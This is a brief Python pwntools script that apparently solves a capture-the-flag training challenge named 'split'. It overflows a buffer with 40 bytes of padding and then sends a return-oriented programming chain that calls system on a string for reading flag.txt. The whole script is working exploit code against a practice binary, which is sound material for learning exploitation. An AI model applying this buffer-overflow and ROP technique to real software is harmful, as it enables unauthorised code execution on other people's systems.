
from pwn import *

p = process('./split')
p.recv()

rop_chain = p64(0x00400883) #adds address of pop rdi; ret;
rop_chain += p64(0x00601060) # adds "bin/cat flag.txt
rop_chain += p64(0x00400810) # adds system call
rop_chain += p64(0x42424242) #padding

p.sendline("A"*40 + rop_chain)

print(p.recv())

#p.interactive()








